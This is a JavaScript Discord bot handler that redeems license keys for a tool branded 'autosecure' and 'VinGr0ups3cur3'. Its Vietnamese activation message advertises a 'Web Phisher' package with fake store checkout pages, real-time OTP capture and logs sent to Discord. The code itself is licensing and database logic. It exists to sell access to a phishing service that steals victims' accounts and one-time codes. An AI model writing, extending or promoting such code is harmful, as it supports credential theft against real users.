const { EmbedBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");
const { notifierWebhook, roleid, guildid } = require("../../../config.json");
const { autosecurelogs } = require("../../../autosecure/utils/embeds/autosecurelogs");
const access = require("../../../db/access");
const quicksetupmsg = require("../../../autosecure/utils/embeds/quicksetupmsg");
const { redeemSlotKey, redeemLicense } = require("../../../autosecure/utils/bot/redeemutils")

module.exports = {
  name: "licensemodal",
  callback: async (client, interaction) => {
    await interaction.deferReply({ ephemeral: true });

    try {
      const license = interaction.fields.getTextInputValue("licenseInput");

      const licenseData = await queryParams("SELECT license, duration FROM licenses WHERE license=?", [license]);
      const slots = await queryParams("SELECT * FROM unusedslots WHERE unusedslots=?", [license]);
      const webLicenseData = await queryParams("SELECT license, duration FROM web_licenses WHERE license=?", [license]);
      const blacklistCheck = await queryParams("SELECT * FROM autosecureblacklist WHERE user_id=?", [interaction.user.id]);
      const usedCheck = await queryParams("SELECT * FROM usedLicenses WHERE license=?", [license]);

      if (blacklistCheck.length > 0) {
        const embed = new EmbedBuilder()
          .setColor('#5f9ea0')
          .setDescription(`**You are blacklisted from using VinGr0ups3cur3!**\nReason: ${blacklistCheck[0].reason || "No reason provided"}`);
        return interaction.editReply({ embeds: [embed] });
      }

      // Web License redemption
      if (webLicenseData.length > 0) {
        const { redeemWebLicense } = require("../../../autosecure/utils/web/webAccess");
        const result = await redeemWebLicense(interaction.user.id, license);
        if (!result.success) {
          const embed = new EmbedBuilder().setColor(0xED4245).setDescription(`❌ ${result.message}`);
          return interaction.editReply({ embeds: [embed] });
        }
        const expSec = Math.floor(result.expiry / 1000);
        const embed = new EmbedBuilder()
          .setColor(0x57F287)
          .setTitle(result.isExtension ? "🎉 Gia Hạn Bản Quyền Web Thành Công!" : "🎉 Kích Hoạt Bản Quyền Web Thành Công!")
          .setDescription(
            `### Đã kích hoạt gói sử dụng Web Phisher\n\n` +
            `• **Người dùng:** <@${interaction.user.id}>\n` +
            `• **Số ngày cộng thêm:** **${result.daysAdded} ngày**\n` +
            `• **Hết hạn:** <t:${expSec}:R> (<t:${expSec}:F>)\n\n` +
            `✅ **Quyền lợi mở khoá:**\n` +
            `• Lệnh tạo link web store: \`/donut link\`\n` +
            `• Hệ thống Fake Store Checkout & Bắt OTP thời gian thực\n` +
            `• Gửi log trực tiếp về Discord Bot`
          )
          .setFooter({ text: "DonutSMP Web License System" })
          .setTimestamp();
        return interaction.editReply({ embeds: [embed] });
      }

      // Sometimes useful
      if (usedCheck.length > 0) {
        const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("**Invalid license key-**");
        return interaction.editReply({ embeds: [embed] });
      }

      if (licenseData.length === 0 && slots.length === 0 && webLicenseData.length === 0) {
        const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("**Invalid slot/subscription/web license!** Contact support!");
        return interaction.editReply({ embeds: [embed] });
      }


      if (slots.length > 0) {
        let d = await access(interaction.user.id);
        if (!d) {
          const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("You need to buy a license first to use this bot slot!");
          return interaction.editReply({ embeds: [embed] });
        }
        await redeemSlotKey(client, interaction, slots[0].unusedslots);
        return;
      }


      // Slot already checked, redeem a license.
      await redeemLicense(client, interaction, license, licenseData[0]);
    } catch (error) {
      console.error("Error in licensemodal:", error);
      const embed = new EmbedBuilder().setColor('#5f9ea0').setDescription("**An error occurred while processing the license.**");
      await interaction.editReply({ embeds: [embed] });
    }
  }
};
